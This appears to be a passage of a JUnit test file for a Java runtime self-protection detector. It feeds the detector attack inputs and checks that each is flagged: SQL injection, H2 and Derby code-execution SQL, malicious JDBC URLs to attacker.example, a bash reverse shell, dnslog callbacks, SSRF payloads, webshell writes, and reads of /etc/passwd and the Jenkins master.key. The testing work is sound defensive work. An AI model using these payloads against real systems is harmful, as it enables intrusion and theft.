package io.ohmyrasp.agent.detect;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.Detection;
import io.ohmyrasp.agent.model.RequestContext;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import org.junit.jupiter.api.Test;

final class DetectorEngineTest {
  private final DetectorEngine engine = new DetectorEngine();

  @Test
  void detectsSqlUserInput() {
    var result =
        engine.detectSql(
            "select * from users where name = '' OR '1'='1'",
            request(Map.of("value", List.of("' OR '1'='1"))));

    assertTrue(result.isPresent());
    assertEquals("sql_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlPolicyFeatures() {
    var result = engine.detectSql("select 1 union select password from users", request());

    assertTrue(result.isPresent());
    assertEquals("sql_policy", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlExceptionSignals() {
    var result =
        engine.detectSqlException(
            "mysql",
            "1064",
            "",
            "You have an error in your SQL syntax",
            "select * from where",
            request());

    assertAlgorithm(result, "sql_exception");
  }

  @Test
  void detectsSqlRegex() {
    var result =
        engine.detectSqlRegex(
            "select table_name from information_schema.tables", "information_schema", request());

    assertAlgorithm(result, "sql_regex");
  }

  @Test
  void detectsH2JavaAliasCodeExecution() {
    var result =
        engine.detectSql(
            """
            CREATE ALIAS SHELL AS $$
            String shell(String cmd) throws java.io.IOException {
              java.lang.Runtime.getRuntime().exec(cmd);
              return cmd;
            }
            $$
            """,
            request());

    assertAlgorithm(result, "sql_h2_code_execution");
  }

  @Test
  void detectsH2RemoteRunScript() {
    var result = engine.detectSql("RUNSCRIPT FROM 'http://example.com/evil.sql'", request());

    assertAlgorithm(result, "sql_h2_code_execution");
  }

  @Test
  void detectsDerbyJavaCodeLoadingSqlDuringRequest() {
    String query =
        """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL SQLJ.INSTALL_JAR('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;

    var result = engine.detectSql(query, request(Map.of("sql", List.of("SQLJ.INSTALL_JAR"))));

    assertAlgorithm(result, "sql_derby_code_execution");
  }

  @Test
  void detectsNacosCve202129442DerbyOpsJavaCodeLoadingSql() {
    String query =
        """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL sqlj.install_jar('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;

    var result =
        engine.detectSql(
            query,
            new RequestContext(
                "GET",
                "/nacos/v1/cs/ops/derby",
                "sql=" + query,
                Map.of("sql", List.of(query)),
                Map.of("user-agent", "JUnit")));

    assertAlgorithm(result, "sql_derby_code_execution");
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
  }

  @Test
  void ignoresDerbyJavaRoutineSqlOutsideRequest() {
    String query =
        "CREATE FUNCTION APP.ADD_ONE(PARAM INT) RETURNS INT "
            + "PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'com.example.Math.addOne'";

    assertTrue(engine.detectSql(query, RequestContext.empty()).isEmpty());
  }

  @Test
  void ignoresOrdinaryH2Alias() {
    var result = engine.detectSql("CREATE ALIAS UUID FOR \"java.util.UUID.randomUUID\"", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsH2JdbcInitCodeExecution() {
    var result =
        engine.detectJdbcUrl(
            "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript java.lang.Runtime.getRuntime().exec(\"id\") $$;AUTHZPWD=\\",
            request());

    assertAlgorithm(result, "jdbc_h2_init");
  }

  @Test
  void ignoresOrdinaryH2JdbcUrl() {
    var result = engine.detectJdbcUrl("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMysqlJdbcDeserializationUrl() {
    String url =
        "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = engine.detectJdbcUrl(url, request(Map.of("url", List.of(url))));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
  }

  @Test
  void detectsLinkisCve202244645MysqlDatasourceConnectParams() {
    String params =
        "{\"autoDeserialize\":\"true\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"useSSL\":\"false\",\"maxAllowedPacket\":\"16777216\"}";
    String body =
        "{\"dataSourceName\":\"evil\",\"dataSourceTypeId\":1,\"createSystem\":\"Linkis\","
            + "\"connectParams\":{\"host\":\"attacker.example\",\"port\":\"3308\","
            + "\"username\":\"dd14fff\",\"password\":\"x\",\"params\":\""
            + jsonString(params)
            + "\"}}";
    String url =
        "jdbc:mysql://attacker.example:3308/?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false&maxAllowedPacket=16777216";

    var result =
        engine.detectJdbcUrl(
            url,
            new RequestContext(
                "POST",
                "/api/rest_j/v1/data-source-manager/op/connect/json",
                "",
                Map.of(
                    "host",
                    List.of("attacker.example"),
                    "port",
                    List.of("3308"),
                    "params",
                    List.of(params)),
                Map.of("content-type", "application/json;charset=UTF-8", "user-agent", "JUnit"),
                body));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
    assertEquals("mysql", result.orElseThrow().details().get("driver"));
  }

  @Test
  void detectsMariaDbJdbcDeserializationUrl() {
    String url =
        "jdbc:mariadb://attacker.example:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = engine.detectJdbcUrl(url, request(Map.of("jdbcUrl", List.of(url))));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
  }

  @Test
  void ignoresMysqlJdbcDeserializationUrlWithoutRequestControl() {
    String url =
        "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = engine.detectJdbcUrl(url, request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresRequestControlledOrdinaryMysqlJdbcUrl() {
    String url = "jdbc:mysql://db.example:3306/app?useSSL=false&connectTimeout=1000";

    var result = engine.detectJdbcUrl(url, request(Map.of("url", List.of(url))));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsCommandUserInput() {
    var result =
        engine.detectCommand(
            List.of("sh", "-c", "echo ok; cat /etc/passwd"),
            request(Map.of("cmd", List.of("cat /etc/passwd"))));

    assertTrue(result.isPresent());
    assertEquals("command_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsCommonDangerousCommand() {
    var result = engine.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());

    assertTrue(result.isPresent());
    assertEquals("command_common", result.orElseThrow().algorithm());
  }

  @Test
  void detectsReflectiveCommandStack() {
    var result =
        engine.detectCommand(
            List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"));

    assertAlgorithm(result, "command_reflect");
  }

  @Test
  void detectsSpringExpressionCommandStack() {
    var result =
        engine.detectCommand(
            List.of("id"),
            request(),
            List.of(
                "org.springframework.expression.spel.ast.MethodReference",
                "org.springframework.expression.spel.standard.SpelExpression"));

    assertAlgorithm(result, "spel_runtime");
  }

  @Test
  void detectsGroovyCommandStack() {
    var result =
        engine.detectCommand(
            List.of("id"),
            request(),
            List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods"));

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsGremlinGroovyCommandStack() {
    var result =
        engine.detectCommand(
            List.of("id"),
            request(),
            List.of("org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine"));

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsSolrCve201712629ConfiguredExecutableListenerCommandStack() {
    var result =
        engine.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            request(),
            List.of("org.apache.solr.core.RunExecutableListener"));

    assertAlgorithm(result, "command_config_listener");
    assertEquals(
        "org.apache.solr.core.RunExecutableListener",
        result.orElseThrow().details().get("listener"));
  }

  @Test
  void detectsRocketMqCve202333246RuntimeConfigCommandLauncherStack() {
    var result =
        engine.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            RequestContext.empty(),
            List.of(
                "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
                "org.apache.rocketmq.broker.filtersrv.FilterServerUtil"));

    assertAlgorithm(result, "command_config_injection");
    assertEquals(
        "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
        result.orElseThrow().details().get("launcher"));
  }

  @Test
  void detectsRhinoJavascriptCommandStack() {
    var result =
        engine.detectCommand(
            List.of("sh", "-c", "id"),
            request(),
            List.of(
                "org.mozilla.javascript.NativeJavaMethod",
                "org.mozilla.javascript.Context"));

    assertAlgorithm(result, "javascript_runtime");
  }

  @Test
  void detectsTemplateCommandStack() {
    var result =
        engine.detectCommand(
            List.of("id"),
            request(),
            List.of("freemarker.template.utility.Execute"));

    assertAlgorithm(result, "template_runtime");
  }

  @Test
  void ignoresPlainLowSignalCommandWithoutRuntimeStack() {
    var result = engine.detectCommand(List.of("id"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLowSignalTouchCommandWithoutExecutableListenerStack() {
    var result = engine.detectCommand(List.of("sh", "-c", "touch /tmp/success"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLowSignalTouchWithOrdinarySchedulerStack() {
    var result =
        engine.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            RequestContext.empty(),
            List.of("java.util.concurrent.ScheduledThreadPoolExecutor"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsCommandSyntaxError() {
    var result = engine.detectCommand(List.of("sh", "-c", "echo 'unterminated"), request());

    assertAlgorithm(result, "command_error");
  }

  @Test
  void detectsDnslogCommand() {
    var result = engine.detectCommand(List.of("curl", "http://abc.dnslog.cn/a"), request());

    assertAlgorithm(result, "command_dnslog");
  }

  @Test
  void detectsSsrfAwsMetadata() {
    var result = engine.detectUrl("http://169.254.169.254/latest/meta-data/", request());

    assertTrue(result.isPresent());
    assertEquals("ssrf_aws", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSsrfUserInput() {
    var result =
        engine.detectUrl(
            "http://127.0.0.1/admin",
            request(Map.of("url", List.of("http://127.0.0.1/admin"))));

    assertAlgorithm(result, "ssrf_userinput");
  }

  @Test
  void detectsGeoServerCve202140822TestWfsPostExternalSsrfRelay() {
    String target = "http://interal/geoserver/../";
    var context =
        new RequestContext(
            "POST",
            "/geoserver/TestWfsPost",
            "url=http%3A%2F%2Finteral%2Fgeoserver%2F..%2F&body=testtest",
            Map.of(
                "url",
                List.of(target),
                "body",
                List.of("testtest"),
                "username",
                List.of("admin"),
                "password",
                List.of("admin")),
            Map.of("user-agent", "JUnit", "host", "interal"));

    var result = engine.detectUrl(target, context);

    assertAlgorithm(result, "ssrf_userinput");
    assertEquals("interal", result.orElseThrow().details().get("host"));
    assertEquals(target, result.orElseThrow().details().get("url"));
  }

  @Test
  void detectsWebLogicUddiExplorerOperatorSsrfRelay() {
    String target =
        "http://172.19.0.2:6379/test%0D%0A%0D%0Aconfig%20set%20dir%20/etc/%0D%0Asave";
    var context =
        new RequestContext(
            "GET",
            "/uddiexplorer/SearchPublicRegistries.jsp",
            "rdoSearch=name&txtSearchname=sdf&selfor=Business+location&operator="
                + "http%3A%2F%2F172.19.0.2%3A6379%2Ftest%250D%250A%250D%250Aconfig%2520set%2520dir%2520%2Fetc%2F%250D%250Asave",
            Map.of(
                "rdoSearch",
                List.of("name"),
                "txtSearchname",
                List.of("sdf"),
                "selfor",
                List.of("Business location"),
                "operator",
                List.of(target)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectUrl(target, context);

    assertAlgorithm(result, "ssrf_userinput");
    assertEquals("172.19.0.2", result.orElseThrow().details().get("host"));
    assertEquals(target, result.orElseThrow().details().get("url"));
  }

  @Test
  void ignoresPublicExternalUrlWithoutRequestControl() {
    var result = engine.detectUrl("https://example.com/public.xml", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSsrfProtocol() {
    var result = engine.detectUrl("gopher://127.0.0.1:6379/_info", request());

    assertAlgorithm(result, "ssrf_protocol");
  }

  @Test
  void detectsCxfXopFileAttachmentReference() {
    var result = engine.detectXmlAttachmentReference("cxf-aegis-xop", "file:///etc/hosts", request());

    assertAlgorithm(result, "ssrf_protocol");
    assertEquals("cxf-aegis-xop", result.orElseThrow().details().get("mechanism"));
  }

  @Test
  void detectsCxfXopCidWrappedFileAttachmentReference() {
    var result =
        engine.detectXmlAttachmentReference("cxf-aegis-xop", "cid:file:///etc/hosts", request());

    assertAlgorithm(result, "ssrf_protocol");
  }

  @Test
  void detectsCxfXopInternalHttpAttachmentReference() {
    var result =
        engine.detectXmlAttachmentReference("cxf-aegis-xop", "http://127.0.0.1/admin", request());

    assertAlgorithm(result, "ssrf_userinput");
  }

  @Test
  void ignoresPublicCxfXopHttpAttachmentReference() {
    var result =
        engine.detectXmlAttachmentReference(
            "cxf-aegis-xop", "https://example.com/public-image.png", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresUnknownXmlAttachmentMechanism() {
    var result =
        engine.detectXmlAttachmentReference("mail-url-datasource", "file:///etc/hosts", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundCxfXopAttachmentReference() {
    var result =
        engine.detectXmlAttachmentReference(
            "cxf-aegis-xop", "file:///etc/hosts", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLocalClasspathJarResource() {
    var result =
        engine.detectUrl(
            "jar:file:/usr/local/tomcat/lib/servlet-api.jar!/jakarta/servlet/LocalStrings.properties",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresSpringBootNestedClasspathResource() {
    var result =
        engine.detectUrl(
            "jar:nested:/app.jar/!BOOT-INF/lib/fastjson-1.2.83.jar!/com/alibaba/fastjson/parser/ParserConfig.class",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresTomcatLibraryFileResource() {
    var result = engine.detectUrl("file:/usr/local/tomcat/lib/servlet-api.jar", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRemoteUrlClassLoaderCodebase() {
    var result =
        engine.detectClassLoaderUrl(
            "http://attacker.example/evil.jar",
            "URLClassLoader",
            request(Map.of("codebase", List.of("http://attacker.example/evil.jar"))));

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void detectsJarWrappedRemoteClassLoaderCodebase() {
    var result =
        engine.detectClassLoaderUrl(
            "jar:http://attacker.example/evil.jar!/payload/",
            "URLClassLoader",
            request());

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void detectsRmiClassLoaderCodebase() {
    var result =
        engine.detectClassLoaderUrl(
            "ldap://attacker.example/Exploit",
            "RMIClassLoader",
            request());

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void ignoresLocalUrlClassLoaderCodebase() {
    var result =
        engine.detectClassLoaderUrl(
            "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar",
            "URLClassLoader",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRemoteSpringConfigLocation() {
    var result =
        engine.detectSpringConfigLocation(
            "http://attacker.example/poc.xml",
            "SpringConfig",
            request(Map.of("config", List.of("http://attacker.example/poc.xml"))));

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void detectsXbeanRemoteSpringConfigLocation() {
    var result =
        engine.detectSpringConfigLocation(
            "xbean:http://attacker.example/poc.xml",
            "SpringConfig",
            request());

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void detectsJarWrappedRemoteSpringConfigLocation() {
    var result =
        engine.detectSpringConfigLocation(
            "jar:http://attacker.example/poc.jar!/beans.xml",
            "SpringConfig",
            request());

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void ignoresLocalSpringConfigLocation() {
    assertTrue(
        engine
            .detectSpringConfigLocation("classpath:applicationContext.xml", "SpringConfig", request())
            .isEmpty());
    assertTrue(
        engine
            .detectSpringConfigLocation("file:/opt/app/applicationContext.xml", "SpringConfig", request())
            .isEmpty());
  }

  @Test
  void detectsRequestTimeJmxRemoteConfigInvocation() {
    var result =
        engine.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            request());

    assertAlgorithm(result, "jmx_remote_config");
  }

  @Test
  void detectsActiveMqJolokiaBrokerConfigInvocation() {
    String body =
        "{\"type\":\"exec\","
            + "\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\","
            + "\"operation\":\"addNetworkConnector(java.lang.String)\","
            + "\"arguments\":[\"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)\"]}";
    RequestContext request =
        new RequestContext(
            "POST",
            "/api/jolokia/",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "authorization", "Basic YWRtaW46YWRtaW4="),
            body);

    var result =
        engine.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector(java.lang.String)",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            request);

    assertAlgorithm(result, "jmx_remote_config");
    assertEquals(100, result.orElseThrow().confidence());
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
    assertEquals("/api/jolokia/", result.orElseThrow().request().uri());
  }

  @Test
  void detectsRequestTimeJmxScriptFileWriteInvocation() {
    var result =
        engine.detectJmxMBeanInvoke(
            "jdk.management.jfr:type=FlightRecorder",
            "copyTo",
            List.of("42", "/opt/activemq/webapps/admin/shelljfr.jsp"),
            request());

    assertAlgorithm(result, "jmx_file_write");
  }

  @Test
  void detectsActiveMqJolokiaLog4jConfigFileWrite() {
    String config =
        "<Configuration><Appenders><RollingRandomAccessFile name=\"RollingFile\" "
            + "fileName=\"/opt/activemq/webapps/admin/shell.jsp\"/></Appenders></Configuration>";
    String body =
        "{\"type\":\"exec\","
            + "\"mbean\":\"org.apache.logging.log4j2:type=LoggerContext,ctx=default\","
            + "\"operation\":\"setConfigText\","
            + "\"arguments\":[\""
            + config.replace("\\", "\\\\").replace("\"", "\\\"")
            + "\",\"utf-8\"]}";
    RequestContext request =
        new RequestContext(
            "POST",
            "/api/jolokia/",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "authorization", "Basic YWRtaW46YWRtaW4="),
            body);

    var result =
        engine.detectJmxMBeanInvoke(
            "org.apache.logging.log4j2:type=LoggerContext,ctx=default",
            "setConfigText",
            List.of(config, "utf-8"),
            request);

    assertAlgorithm(result, "jmx_file_write");
    assertEquals("/api/jolokia/", result.orElseThrow().request().uri());
    assertEquals("/opt/activemq/webapps/admin/shell.jsp", result.orElseThrow().details().get("path"));
  }

  @Test
  void detectsRequestTimeJmxConfigTextScriptFileWriteInvocation() {
    var result =
        engine.detectJmxMBeanInvoke(
            "org.apache.logging.log4j2:type=LoggerContext,ctx=default",
            "setConfigText",
            List.of("<File name=\"shell\" fileName=\"/opt/activemq/webapps/admin/shell.jsp\"/>"),
            request());

    assertAlgorithm(result, "jmx_file_write");
  }

  @Test
  void ignoresReadOnlyJmxRemoteUrlArgument() {
    var result =
        engine.detectJmxMBeanInvoke(
            "example:type=Info",
            "getStatus",
            List.of("http://example.com/status"),
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJmxBenignFileWriteTarget() {
    var result =
        engine.detectJmxMBeanInvoke(
            "example:type=Logger",
            "setLogFile",
            List.of("/var/log/app/current.log"),
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundJmxRemoteConfigInvocation() {
    var result =
        engine.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsArgs4jArgumentFileExpansionForJenkinsMasterKey() {
    var result =
        engine.detectArgumentFileExpansion(
            "args4j",
            List.of("help", "@/var/jenkins_home/secrets/master.key"),
            request());

    assertAlgorithm(result, "readFile_argument_expansion");
    assertEquals("args4j", result.orElseThrow().details().get("parser"));
  }

  @Test
  void detectsArgs4jArgumentFileExpansionForProcEnviron() {
    var result =
        engine.detectArgumentFileExpansion(
            "args4j",
            List.of("@/proc/self/environ"),
            request(Map.of("arg", List.of("@/proc/self/environ"))));

    assertAlgorithm(result, "readFile_argument_expansion");
    assertEquals("/proc/self/environ", result.orElseThrow().details().get("path"));
  }

  @Test
  void detectsArgs4jArgumentFileExpansionForJenkinsConnectNodePasswd() {
    var result =
        engine.detectArgumentFileExpansion(
            "args4j",
            List.of("connect-node", "@/etc/passwd"),
            request(Map.of("arg", List.of("connect-node", "@/etc/passwd"))));

    assertAlgorithm(result, "readFile_argument_expansion");
    assertEquals("@/etc/passwd", result.orElseThrow().details().get("argument"));
    assertEquals("/etc/passwd", result.orElseThrow().details().get("path"));
  }

  @Test
  void ignoresRelativeArgs4jArgumentFileExpansion() {
    var result =
        engine.detectArgumentFileExpansion(
            "args4j", List.of("@relative/options.txt"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresUnknownArgumentFileExpansionParser() {
    var result =
        engine.detectArgumentFileExpansion(
            "picocli", List.of("@/var/jenkins_home/secrets/master.key"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundArgumentFileExpansion() {
    var result =
        engine.detectArgumentFileExpansion(
            "args4j",
            List.of("@/var/jenkins_home/secrets/master.key"),
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSsrfCommonCallbackDomain() {
    var result = engine.detectUrl("http://probe.dnslog.cn/callback", request());

    assertAlgorithm(result, "ssrf_common");
  }

  @Test
  void detectsSsrfObfuscatedHost() {
    var result = engine.detectUrl("http://2130706433/", request());

    assertAlgorithm(result, "ssrf_obfuscate");
  }

  @Test
  void detectsDnslogHost() {
    var result = engine.detectDns("abc.dnslog.cn", request());

    assertTrue(result.isPresent());
    assertEquals("dns_blacklist", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSensitiveFileRead() {
    var result = engine.detectFileRead("/etc/passwd", request(), false);

    assertTrue(result.isPresent());
    assertEquals("readFile_unwanted", result.orElseThrow().algorithm());
  }

  @Test
  void detectsHttpFileReadFromUserInput() {
    var result =
        engine.detectFileRead(
            "http://127.0.0.1/internal",
            request(Map.of("file", List.of("http://127.0.0.1/internal"))),
            false);

    assertAlgorithm(result, "readFile_userinput_http");
  }

  @Test
  void detectsUnwantedFileReadProtocolFromUserInput() {
    var result =
        engine.detectFileRead(
            "file:///etc/passwd", request(Map.of("file", List.of("file:///etc/passwd"))), false);

    assertAlgorithm(result, "readFile_userinput_unwanted");
  }

  @Test
  void detectsMetabaseGeojsonFileReadProtocolFromUserInput() {
    var result =
        engine.detectFileRead(
            "file:////etc/passwd", request(Map.of("url", List.of("file:////etc/passwd"))), false);

    assertAlgorithm(result, "readFile_userinput_unwanted");
  }

  @Test
  void detectsFileReadOutsideWebroot() {
    var result = engine.detectFileRead("/etc/hosts", request(), false);

    assertAlgorithm(result, "readFile_outsideWebroot");
  }

  @Test
  void detectsXxeFileReadFromParserStackHint() {
    var result = engine.detectFileRead("/etc/passwd", request(), true);

    assertTrue(result.isPresent());
    assertEquals("xxe_file", result.orElseThrow().algorithm());
  }

  @Test
  void ignoresSimpleParameterNameSubstringInLibraryFileRead() {
    var result =
        engine.detectFileRead(
            "/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/spring-expression-7.0.7.jar",
            request(Map.of("expr", List.of("T(java.lang.Runtime).getRuntime().exec('id')"))),
            false);

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsScriptFileWrite() {
    var result = engine.detectFileWrite("/usr/local/tomcat/webapps/ROOT/shell.jsp", request());

    assertTrue(result.isPresent());
    assertEquals("writeFile_script", result.orElseThrow().algorithm());
  }

  @Test
  void detectsNtfsFileWrite() {
    var result = engine.detectFileWrite("C:/inetpub/wwwroot/upload.txt::$DATA", request());

    assertAlgorithm(result, "writeFile_NTFS");
  }

  @Test
  void detectsReflectiveJspFileWrite() {
    var result =
        engine.detectFileWrite(
            "/usr/local/tomcat/webapps/ROOT/shell.jsp",
            request(),
            List.of("java.lang.reflect.Method", "shell.Backdoor"));

    assertAlgorithm(result, "writeFile_reflect");
  }

  @Test
  void detectsOpenTsdbCve202035476GeneratedGnuplotYrangeScriptWrite() {
    String payload = "[0:system('touch /tmp/success')]";
    String content = "set yrange " + payload + "\nplot '-' using 1:2";

    var result =
        engine.detectGeneratedScriptFileWrite(
            "/tmp/opentsdb-plot.gnuplot",
            content,
            request(Map.of("yrange", List.of(payload))));

    assertAlgorithm(result, "writeFile_generated_script");
  }

  @Test
  void detectsOpenTsdbCve202325826GeneratedGnuplotKeyScriptWrite() {
    String payload = ";system \"touch /tmp/poc\" \"";
    String content = "set key " + payload + "\nplot '-' using 1:2";

    var result =
        engine.detectGeneratedScriptFileWrite(
            "/tmp/tsd-graph.gp",
            content,
            request(Map.of("key", List.of(payload))));

    assertAlgorithm(result, "writeFile_generated_script");
  }

  @Test
  void ignoresBenignGeneratedGnuplotScriptWrite() {
    var result =
        engine.detectGeneratedScriptFileWrite(
            "/tmp/opentsdb-plot.gnuplot",
            "set yrange [0:42]\nplot '-' using 1:2",
            request(Map.of("yrange", List.of("[0:42]"))));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRocketMqCve202337582UnsafeConfigPersistenceFileWrite() {
    var result =
        engine.detectFileWrite(
            "/tmp/success",
            RequestContext.empty(),
            List.of(
                "org.apache.rocketmq.remoting.Configuration",
                "org.apache.rocketmq.common.MixAll"));

    assertAlgorithm(result, "writeFile_config_path");
    assertEquals(
        "org.apache.rocketmq.remoting.Configuration",
        result.orElseThrow().details().get("persistence"));
  }

  @Test
  void ignoresNormalConfigPersistenceFileWrite() {
    var result =
        engine.detectFileWrite(
            "/root/namesrv/namesrv.properties",
            RequestContext.empty(),
            List.of(
                "org.apache.rocketmq.remoting.Configuration",
                "org.apache.rocketmq.common.MixAll"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsArchiveTraversalExtraction() {
    var result =
        engine.detectArchiveExtraction(
            "../escaped/archive.txt", "/tmp/ohmyrasp/root/../escaped/archive.txt", request());

    assertAlgorithm(result, "archive_traversal");
  }

  @Test
  void detectsAbsoluteArchiveEntryExtraction() {
    var result = engine.detectArchiveExtraction("/tmp/evil.txt", "/tmp/evil.txt", request());

    assertAlgorithm(result, "archive_traversal");
  }

  @Test
  void ignoresNormalArchiveEntryExtraction() {
    var result =
        engine.detectArchiveExtraction(
            "docs/readme.txt", "/tmp/ohmyrasp/root/docs/readme.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresSanitizedArchiveTraversalEntry() {
    var result =
        engine.detectArchiveExtraction(
            "../escaped/archive.txt", "/tmp/ohmyrasp/root/safe/archive.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsDirectoryUserInput() {
    var result = engine.detectDirectoryList("/etc", request(Map.of("path", List.of("/etc"))));

    assertTrue(result.isPresent());
    assertEquals("directory_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsUnwantedDirectoryList() {
    var result = engine.detectDirectoryList("/root", request());

    assertAlgorithm(result, "directory_unwanted");
  }

  @Test
  void detectsReflectiveDirectoryList() {
    var result =
        engine.detectDirectoryList("/tmp", request(), List.of("java.lang.reflect.Method"));

    assertAlgorithm(result, "directory_reflect");
  }

  @Test
  void detectsIncludeUserInput() {
    var result =
        engine.detectInclude(
            "/etc/passwd", "/etc/passwd", "include", request(Map.of("file", List.of("/etc/passwd"))));

    assertAlgorithm(result, "include_userinput");
  }

  @Test
  void detectsIncludeProtocol() {
    var result = engine.detectInclude("jar://file:/tmp/a.jar!/x", "", "include", request());

    assertAlgorithm(result, "include_protocol");
  }

  @Test
  void detectsForgedServletIncludeAttributeForProtectedResource() {
    var result =
        engine.detectServletIncludeAttributes(
            Map.of("javax.servlet.include.servlet_path", "/WEB-INF/web.xml"),
            requestUri("/"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertAlgorithm(result, "request_forged_include_attribute");
    assertEquals("protected-resource", result.orElseThrow().details().get("targetType"));
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals(
        "servlet-include-attribute", result.orElseThrow().details().get("source"));
  }

  @Test
